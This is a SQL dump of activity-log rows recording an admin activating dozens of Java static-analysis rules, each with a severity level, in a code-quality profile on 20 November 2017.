INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3452, '2017-11-20 12:51:28.166', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8UmbbGRdfPp-rTg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3453, '2017-11-20 12:51:28.226', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8VibbGRdfPp-rTh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3454, '2017-11-20 12:51:28.597', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8bUbbGRdfPp-rTi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3455, '2017-11-20 12:51:28.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8cMbbGRdfPp-rTj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3456, '2017-11-20 12:51:28.685', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8ctbbGRdfPp-rTk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3457, '2017-11-20 12:51:28.716', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8dMbbGRdfPp-rTl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3458, '2017-11-20 12:51:28.746', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8dqbbGRdfPp-rTm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3459, '2017-11-20 12:51:28.774', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8eGbbGRdfPp-rTn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3460, '2017-11-20 12:51:28.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8ejbbGRdfPp-rTo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3461, '2017-11-20 12:51:28.848', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8fQbbGRdfPp-rTp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3462, '2017-11-20 12:51:28.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8gXbbGRdfPp-rTq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3463, '2017-11-20 12:51:28.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8hMbbGRdfPp-rTr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3464, '2017-11-20 12:51:29.017', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8h5bbGRdfPp-rTs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3465, '2017-11-20 12:51:29.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8jGbbGRdfPp-rTt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3466, '2017-11-20 12:51:29.147', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8j7bbGRdfPp-rTu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3467, '2017-11-20 12:51:29.179', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8kbbbGRdfPp-rTv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3468, '2017-11-20 12:51:29.222', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8lGbbGRdfPp-rTw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3469, '2017-11-20 12:51:29.269', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8l1bbGRdfPp-rTx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3470, '2017-11-20 12:51:29.314', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8mibbGRdfPp-rTy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3471, '2017-11-20 12:51:29.341', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8m8bbGRdfPp-rTz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3472, '2017-11-20 12:51:29.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8nYbbGRdfPp-rT0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3473, '2017-11-20 12:51:29.403', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8n7bbGRdfPp-rT1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3474, '2017-11-20 12:51:29.426', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8oSbbGRdfPp-rT2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3475, '2017-11-20 12:51:29.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8okbbGRdfPp-rT3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3476, '2017-11-20 12:51:29.482', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8pKbbGRdfPp-rT4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3477, '2017-11-20 12:51:29.526', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8p2bbGRdfPp-rT5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3478, '2017-11-20 12:51:29.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8qUbbGRdfPp-rT6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3479, '2017-11-20 12:51:29.584', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8qwbbGRdfPp-rT7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3480, '2017-11-20 12:51:29.612', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8rMbbGRdfPp-rT8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3481, '2017-11-20 12:51:29.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8rqbbGRdfPp-rT9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3482, '2017-11-20 12:51:29.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8sHbbGRdfPp-rT-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3483, '2017-11-20 12:51:29.702', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8smbbGRdfPp-rT_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3484, '2017-11-20 12:51:29.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8tEbbGRdfPp-rUA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3485, '2017-11-20 12:51:29.76', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8tgbbGRdfPp-rUB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3486, '2017-11-20 12:51:29.792', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8uAbbGRdfPp-rUC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3487, '2017-11-20 12:51:29.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8ucbbGRdfPp-rUD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3488, '2017-11-20 12:51:29.852', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8u8bbGRdfPp-rUE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3489, '2017-11-20 12:51:29.872', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8vQbbGRdfPp-rUF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3490, '2017-11-20 12:51:29.898', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8vqbbGRdfPp-rUG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3491, '2017-11-20 12:51:29.928', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8wHbbGRdfPp-rUH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3492, '2017-11-20 12:51:29.963', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8wrbbGRdfPp-rUI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3493, '2017-11-20 12:51:30.01', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8xabbGRdfPp-rUJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3494, '2017-11-20 12:51:30.059', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8yLbbGRdfPp-rUK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3495, '2017-11-20 12:51:30.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8zPbbGRdfPp-rUL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3496, '2017-11-20 12:51:30.176', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze80AbbGRdfPp-rUM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3497, '2017-11-20 12:51:30.232', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze804bbGRdfPp-rUN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3498, '2017-11-20 12:51:30.274', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze81ibbGRdfPp-rUO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3499, '2017-11-20 12:51:30.302', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze81-bbGRdfPp-rUP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3500, '2017-11-20 12:51:30.328', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze82YbbGRdfPp-rUQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3501, '2017-11-20 12:51:30.356', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze820bbGRdfPp-rUR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3502, '2017-11-20 12:51:30.383', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze83PbbGRdfPp-rUS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3503, '2017-11-20 12:51:30.416', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze83wbbGRdfPp-rUT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3504, '2017-11-20 12:51:30.461', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze84dbbGRdfPp-rUU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3505, '2017-11-20 12:51:30.478', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze84ubbGRdfPp-rUV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3506, '2017-11-20 12:51:30.51', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze85ObbGRdfPp-rUW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3507, '2017-11-20 12:51:30.535', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze85nbbGRdfPp-rUX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3508, '2017-11-20 12:51:30.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze86JbbGRdfPp-rUY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3509, '2017-11-20 12:51:30.613', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze861bbGRdfPp-rUZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3510, '2017-11-20 12:51:30.64', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze87QbbGRdfPp-rUa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3511, '2017-11-20 12:51:30.683', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze877bbGRdfPp-rUb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3512, '2017-11-20 12:51:30.712', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze88YbbGRdfPp-rUc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3513, '2017-11-20 12:51:30.739', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze88zbbGRdfPp-rUd');
